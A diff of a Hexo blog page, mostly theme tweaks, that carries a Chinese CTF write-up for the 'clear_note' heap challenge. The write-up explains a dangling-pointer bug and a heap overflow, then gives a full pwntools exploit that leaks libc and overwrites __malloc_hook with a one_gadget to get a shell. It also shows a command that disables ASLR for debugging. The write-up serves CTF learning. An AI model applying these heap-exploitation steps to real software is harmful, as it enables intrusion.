@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="dg010赛题复现师傅去打dg010去了，扔给我一道题让我做，无奈当时恰好要去上课，做到一半就扔那儿了，现在有时间了，就做了一下。">
@@ -31,7 +31,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-09-09T00:37:40.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.337Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -144,29 +144,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -204,7 +184,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -218,7 +200,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -232,6 +213,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -264,8 +255,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2018/09/09/dg010/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -308,6 +299,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -317,14 +315,14 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h1 id="dg010赛题复现"><a href="#dg010赛题复现" class="headerlink" title="dg010赛题复现"></a>dg010赛题复现</h1><p>师傅去打dg010去了，扔给我一道题让我做，无奈当时恰好要去上课，做到一半就扔那儿了，现在有时间了，就做了一下。</p>
+        <h1 id="dg010赛题复现"><a href="#dg010赛题复现" class="headerlink" title="dg010赛题复现"></a>dg010赛题复现</h1><p>师傅去打dg010去了，扔给我一道题让我做，无奈当时恰好要去上课，做到一半就扔那儿了，现在有时间了，就做了一下。</p>
 <a id="more"></a>  
-<p>首先打开ida看下发现偏移是相对文件的，所以肯定是开启了pie，之后看函数，主要是dele和add里，dele中没有立即对chukList中的ptr清零导致会出现野指针，还有就是add函数中使用的是scanf进行输入，没有对输入长度进行检测，所以存在堆溢出。<br>分析完两个主要的漏洞接下来思考解题策略，开启了pie我们可以通过unsorted bin泄露，得到libc，checksec看了一下发现保护全开，由于保护全开，所以无法进行got覆写之类的，这里考虑mallocHook或者freeHook的覆写，freeHook看了下发现在内存中周边没有合适的size绕过fastbin检查，而mallocHook恰好在ptr-0x13的位置是有合适的size的(低字节0x7f)，如果add的是0x60的fast chunk，那么条件是符合的，所以这里可以用the house of spirit进行mallocHook写oneGadget，就可以利用成功了。<br>这道题的坑点在于开启pie的程序调试的时候不方便，因为代码段是随机化的，break断点不固定，需要手动去断点比较烦。这里要解决这个问题目前我知道的有两种方法，第一种是队友诉我的，通过关闭本地系统的内存地址随机化保护进行调试。echo 0  >/proc/sys/kernel/randomize_va_space 这样的话就能暂时关闭随机化，默认镜像的加载基址是0x555555554000，但是由于ida中显示的指令是相对文件的基址，所以想要下断的话还是需要进行一定的计算，这里队友告诉我可以通过ida中修改segment段的基址，也就是自己制定段加载基址来确定text指令段的内存地址。试了一下还是相当方便的。以后本地调试的时候可以利用这种方法，非常方便。<br>还有一种方法就是通过在脚本中加入一些函数通过查找proc中的相关地址来得到加载地址，也行，不过感觉有一点麻烦，不过调试的时候更加真实吧233333，各有利弊。 </p>
-<figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn import *</span><br><span class="line"><span class="hljs-attribute">p</span>=process('./clear_note')</span><br><span class="line"><span class="hljs-attribute">libc</span>=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="hljs-comment">#gdb.attach(p,'''</span></span><br><span class="line"><span class="hljs-comment">#	break *0x0000555555554E9A </span></span><br><span class="line"><span class="hljs-comment">#	continue</span></span><br><span class="line"><span class="hljs-comment">#''')</span></span><br><span class="line">def <span class="hljs-builtin-name">add</span>(size,data):</span><br><span class="line">    p.recvuntil(<span class="hljs-string">"choice>> "</span>)</span><br><span class="line">    p.sendline(<span class="hljs-string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="hljs-string">"info: "</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.sendline(<span class="hljs-string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(<span class="hljs-string">"choice>> "</span>)</span><br><span class="line">    p.sendline(<span class="hljs-string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">"ndex: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="hljs-string">'info: '</span>)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(<span class="hljs-string">"choice>> "</span>)</span><br><span class="line">    p.sendline(<span class="hljs-string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">"index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="hljs-builtin-name">add</span>(0x100,<span class="hljs-string">'a'</span>)</span><br><span class="line"><span class="hljs-builtin-name">add</span>(0x60,<span class="hljs-string">'b'</span>)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line"><span class="hljs-attribute">arena</span>=u64(p.recv(6).ljust(8,'\x00'))</span><br><span class="line">libc.<span class="hljs-attribute">address</span>=arena-0x3c4b78</span><br><span class="line">log.<span class="hljs-builtin-name">info</span>(<span class="hljs-string">'libcBase > '</span>+hex(libc.address))</span><br><span class="line"><span class="hljs-attribute">mallocHook</span>=libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]</span><br><span class="line">log.<span class="hljs-builtin-name">info</span>(<span class="hljs-string">'__malloc_hook > '</span>+hex(mallocHook))</span><br><span class="line"><span class="hljs-comment">#oneGadget=libc.address+0x45216</span></span><br><span class="line"><span class="hljs-attribute">oneGadget</span>=libc.address+0xf1147</span><br><span class="line"><span class="hljs-comment">#oneGadget=libc.address+0x4526a</span></span><br><span class="line"><span class="hljs-comment">#oneGadget=libc.address+0xf02a4</span></span><br><span class="line"><span class="hljs-attribute">writeAddress</span>=mallocHook-0x13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line"><span class="hljs-builtin-name">add</span>(0x100,<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x100+p64(0)+p64(0x71)+p64(writeAddress))</span><br><span class="line"><span class="hljs-builtin-name">add</span>(0x60,<span class="hljs-string">'b'</span>)</span><br><span class="line">dele(0)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line">dele(1)</span><br><span class="line"><span class="hljs-builtin-name">add</span>(0x60,<span class="hljs-string">'c'</span><span class="hljs-number">*3</span>+p64(oneGadget))</span><br><span class="line">p.recvuntil(<span class="hljs-string">"choice>> "</span>)</span><br><span class="line">p.sendline(<span class="hljs-string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"size: "</span>)</span><br><span class="line">p.sendline(<span class="hljs-string">'10'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<p>首先打开ida看下发现偏移是相对文件的，所以肯定是开启了pie，之后看函数，主要是dele和add里，dele中没有立即对chukList中的ptr清零导致会出现野指针，还有就是add函数中使用的是scanf进行输入，没有对输入长度进行检测，所以存在堆溢出。<br>分析完两个主要的漏洞接下来思考解题策略，开启了pie我们可以通过unsorted bin泄露，得到libc，checksec看了一下发现保护全开，由于保护全开，所以无法进行got覆写之类的，这里考虑mallocHook或者freeHook的覆写，freeHook看了下发现在内存中周边没有合适的size绕过fastbin检查，而mallocHook恰好在ptr-0x13的位置是有合适的size的(低字节0x7f)，如果add的是0x60的fast chunk，那么条件是符合的，所以这里可以用the house of spirit进行mallocHook写oneGadget，就可以利用成功了。<br>这道题的坑点在于开启pie的程序调试的时候不方便，因为代码段是随机化的，break断点不固定，需要手动去断点比较烦。这里要解决这个问题目前我知道的有两种方法，第一种是队友诉我的，通过关闭本地系统的内存地址随机化保护进行调试。echo 0  &gt;/proc/sys/kernel/randomize_va_space 这样的话就能暂时关闭随机化，默认镜像的加载基址是0x555555554000，但是由于ida中显示的指令是相对文件的基址，所以想要下断的话还是需要进行一定的计算，这里队友告诉我可以通过ida中修改segment段的基址，也就是自己制定段加载基址来确定text指令段的内存地址。试了一下还是相当方便的。以后本地调试的时候可以利用这种方法，非常方便。<br>还有一种方法就是通过在脚本中加入一些函数通过查找proc中的相关地址来得到加载地址，也行，不过感觉有一点麻烦，不过调试的时候更加真实吧233333，各有利弊。 </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span>=process('./clear_note')</span><br><span class="line"><span class="attribute">libc</span>=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="comment">#gdb.attach(p,'''</span></span><br><span class="line"><span class="comment">#	break *0x0000555555554E9A </span></span><br><span class="line"><span class="comment">#	continue</span></span><br><span class="line"><span class="comment">#''')</span></span><br><span class="line">def <span class="builtin-name">add</span>(size,data):</span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"info: "</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.sendline(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"ndex: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'info: '</span>)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">add</span>(0x100,<span class="string">'a'</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'b'</span>)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line"><span class="attribute">arena</span>=u64(p.recv(6).ljust(8,'\x00'))</span><br><span class="line">libc.<span class="attribute">address</span>=arena-0x3c4b78</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'libcBase &gt; '</span>+hex(libc.address))</span><br><span class="line"><span class="attribute">mallocHook</span>=libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'__malloc_hook &gt; '</span>+hex(mallocHook))</span><br><span class="line"><span class="comment">#oneGadget=libc.address+0x45216</span></span><br><span class="line"><span class="attribute">oneGadget</span>=libc.address+0xf1147</span><br><span class="line"><span class="comment">#oneGadget=libc.address+0x4526a</span></span><br><span class="line"><span class="comment">#oneGadget=libc.address+0xf02a4</span></span><br><span class="line"><span class="attribute">writeAddress</span>=mallocHook-0x13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">add</span>(0x100,<span class="string">'a'</span><span class="number">*0</span>x100+p64(0)+p64(0x71)+p64(writeAddress))</span><br><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'b'</span>)</span><br><span class="line">dele(0)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line">dele(1)</span><br><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'c'</span><span class="number">*3</span>+p64(oneGadget))</span><br><span class="line">p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">p.sendline(<span class="string">'10'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-</body></html>
+
     </div>
 
     
@@ -399,10 +397,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -428,6 +456,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
